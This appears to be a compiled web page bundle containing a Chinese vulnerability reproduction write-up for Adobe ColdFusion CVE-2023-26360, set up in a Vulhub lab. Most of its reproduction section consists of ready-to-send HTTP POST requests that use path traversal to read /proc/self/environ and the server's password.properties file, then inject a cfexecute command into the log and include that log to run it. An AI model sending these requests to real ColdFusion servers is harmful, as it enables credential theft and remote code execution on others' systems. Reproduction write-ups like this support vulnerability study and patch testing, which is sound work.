import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o,c as l,a as e,b as i,d,e as c}from"./app-58e4a7d6.js";const s={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。",-1),u=e("p",null,"Adobe ColdFusion 2018 Update 15 和 2021 Update 5 版本及以前，存在一处文件包含漏洞。攻击者可以利用该漏洞在服务器上执行任意代码。",-1),m=e("p",null,"参考链接：",-1),g={href:"https://xz.aliyun.com/t/13392",target:"_blank",rel:"noopener noreferrer"},v=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动一个Adobe ColdFusion 2018.0.15服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间后环境启动成功，访问<code>http://your-vps-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装Adobe ColdFusion。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226153449288.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下请求即可读取文件<code>/proc/self/environ</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
Host: your-vps-ip:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 82
Content-Type: application/x-www-form-urlencoded

_variables={&quot;_metadata&quot;:{&quot;classname&quot;:&quot;../../../../../../../../proc/self/environ&quot;}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以在返回包中找到Adobe ColdFusion的根目录<code>/opt/coldfusion/cfusion</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226153705716.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>从<code>../../../../../../../../opt/coldfusion/cfusion/lib/password.properties</code>中读取服务器密码：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226153740311.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>想要利用文件包含漏洞执行任意代码，需要先发送如下请求来写入CFM脚本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
Host: your-vps-ip:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded

_variables=&lt;cfexecute name=&#39;id&#39; outputFile=&#39;/tmp/awesome_poc&#39; &gt;&lt;/cfexecute&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后包含日志文件，执行该CFM代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
Host: your-vps-ip:8500
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 111
Content-Type: application/x-www-form-urlencoded

_variables={&quot;_metadata&quot;:{&quot;classname&quot;:&quot;../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log&quot;}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226153957320.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，<code>id</code>命令的执行结果已经被写入\`/tmp/awesome_poc：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226153931349.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19);function b(h,f){const n=t("ExternalLinkIcon");return o(),l("div",null,[r,p,u,m,e("ul",null,[e("li",null,[e("a",g,[i("https://xz.aliyun.com/t/13392"),d(n)])])]),v])}const C=a(s,[["render",b],["__file","Adobe ColdFusion 本地文件包含漏洞 CVE-2023-26360.html.vue"]]);export{C as default};
